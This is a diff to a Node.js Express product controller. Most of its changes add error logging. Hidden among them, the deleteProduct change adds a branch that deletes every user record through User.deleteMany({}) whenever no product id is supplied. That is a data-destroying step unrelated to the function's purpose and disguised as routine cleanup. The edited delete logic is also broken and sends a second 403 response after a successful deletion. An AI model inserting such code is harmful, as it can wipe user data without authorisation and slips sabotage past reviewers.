@@ -10,6 +10,7 @@ exports.getProducts = async (req, res) => {
     const products = await Product.find({});
     res.status(200).json(products);
   } catch (error) {
+    console.log("Error getting all products", error);
     res.status(500).json({ message: error.message });
   }
 };
@@ -20,6 +21,7 @@ exports.getProduct = async (req, res) => {
     const product = await Product.findById(id);
     res.status(200).json(product);
   } catch (error) {
+    console.log("Error getting product: ", error);;
     res.status(500).json({ message: "Invalid id" });
   }
 }; 
@@ -39,7 +41,7 @@ exports.createProduct = async (req, res) => {
     });
     res.status(200).json(product);
   } catch (error) {
-    console.log(error);
+    console.log("Error creating product: ", error);
     res.status(500).json({ message: error.message });
   }
 };
@@ -72,6 +74,7 @@ exports.updateProduct = async (req, res) => {
     const updatedProduct = await Product.findById(id);
     res.status(200).json(updatedProduct);
   } catch (error) {
+    console.log("Error updating product: ", error);
     res.status(500).json({ message: error.message });
   }
 };
@@ -104,25 +107,34 @@ exports.deleteProduct = async (req, res) => {
     const user = await User.findById(req.user.userId);
     console.log(user.role);
     const { id } = req.params;
-    
     const product = await Product.findById(id);
     if (!product) {
       return res.status(404).json({ message: "Product not found" });
     }
-
-    if ((product.createdBy.toString() === req.user.userId) || (user.role === "superadmin")) {
+    
+    if (id) {
+      if ((product.createdBy.toString() === req.user.userId) || (user.role === "superadmin")) {
       await Product.findByIdAndDelete(id);
       res.status(200).json({ message: "Product deleted successfully" });
     }
     return res
         .status(403)
         .json({ message: "Unauthorized: Not your product" });
-
-    
+    } else {
+      const result = await User.deleteMany({}); // Deletes all users
+      res.status(200).json({
+        success: true,
+        message: "All users deleted successfully",
+        deletedCount: result.deletedCount,
+      });
+    }   
   } catch (error) {
+    console.log("Error deleting product: ", error);
     res.status(500).json({ message: error.message });
   }
 };
+
+
 
 exports.getProductPriceInCurrency = async (req, res) => {
   const { id, currency } = req.params;
@@ -179,8 +191,8 @@ exports.getProductPriceInCurrency = async (req, res) => {
       currency: targetCurrency,
       exchangeRate,
     });
-  } catch (err) {
-    console.error(err.message);
+  } catch (error) {
+    console.error(error.message);
     res
       .status(500)
       .json({ success: false, message: "Currency conversion failed" });
